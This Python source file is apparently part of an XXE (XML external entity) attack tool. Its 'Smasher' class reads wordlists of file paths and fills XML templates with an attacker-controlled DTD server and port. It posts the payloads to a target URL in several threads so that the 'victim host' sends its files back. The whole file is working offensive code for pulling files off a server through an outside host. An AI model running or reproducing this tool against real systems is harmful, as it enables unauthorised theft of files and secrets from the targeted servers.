"""
Simple tcp client that reads a template file, replaces contained tags and sends
the contents to a destination server. Results are sent to a message queue.
"""
import os
import requests
import uuid
from KissKissieBase import KissKissieBase
from Queue import Queue
from threading import Thread


class Smasher(KissKissieBase):
    def __init__(self,
                 queue,
                 target_url,
                 dtd_server,
                 dtd_port,
                 template_name='',
                 dtd_filename='',
                 exfiltrate_wordlists='',
                 debug=False,
                 thread_limit=1,
                 tls_skip_verify=False,
                 auth=None):
        super(Smasher, self).__init__(queue, debug)
        self._buffer_size = 1024
        self._template_name = template_name
        self._dtd_filename = dtd_filename
        self._exfiltrate_filename = None
        self._exfiltrate_wordlists = exfiltrate_wordlists
        self._dtd_server = dtd_server
        self._dtd_port = dtd_port
        self.target_url = target_url
        self.debug = debug
        self.thread_limit = thread_limit
        self.scan_queue = Queue()
        self.tls_skip_verify = tls_skip_verify
        self.auth = auth

    def getNextWordlist(self):
        '''
        Returns a list of filenames within a specified directory.
        '''
        if os.path.isdir(self._exfiltrate_wordlists):
            files = os.listdir(self._exfiltrate_wordlists)
            for filename in files:
                yield os.path.join(self._exfiltrate_wordlists, filename)
        else:
            raise Exception("Wordlist directory ({}) does not exist.".format(
                self._exfiltrate_wordlists))

    def getNextExfiltrateFilename(self):
        '''
        Returns the contents of every file within a specified directory.
        '''
        for file in self.getNextWordlist():
            with open(file, 'r') as f:
                for line in f.xreadlines():
                    yield line.strip()

    def run(self, queue_message=None):
        '''
        Expecting a local text file containing a list of exfiltrate filenames
        and paths for the victim host to send back to us.
        '''
        self.scan_queue.maxsize = self.thread_limit

        for n in range(self.thread_limit):
            thread = Thread(target=self.make_request)
            thread.daemon = True
            thread.start()

        for exfiltrate_filename in self.getNextExfiltrateFilename():
            self.scan_queue.put(exfiltrate_filename, True)

    def make_request(self):
        while True:
            scan_id = str(uuid.uuid4())
            exfil_filename = self.scan_queue.get()

            print("Attempting to exfiltrate {}".format(exfil_filename))

            self._queue.put({
                'scan_id': scan_id,
                'exfiltrate_filename': exfil_filename,
                'target_url': self.target_url,
            })

            headers = {
                'Content-Type': 'application/xml;charset=UTF-8',
                'Accept': 'application/xml',
            }

            template_headers, body_data = self.getTemplate(self._template_name,
                                                           scan_id,
                                                           exfil_filename)
            if template_headers is not None:
                headers.update(template_headers)

            try:
                requests.post(self.target_url,
                              verify=not self.tls_skip_verify,
                              data=body_data, headers=headers, timeout=5,
                              auth=self.auth)
            except requests.exceptions.RequestException as e:
                if self.debug:
                    print(e)
            finally:
                self.scan_queue.task_done()

    def getTemplate(self, template_name, scan_id, exfil_filename):
        return super(Smasher, self).getTemplate(template_name, {
            'scan_id': scan_id,
            'exfiltrate_filename': exfil_filename,
            'dtd_server': self._dtd_server,
            'dtd_port': self._dtd_port,
        })
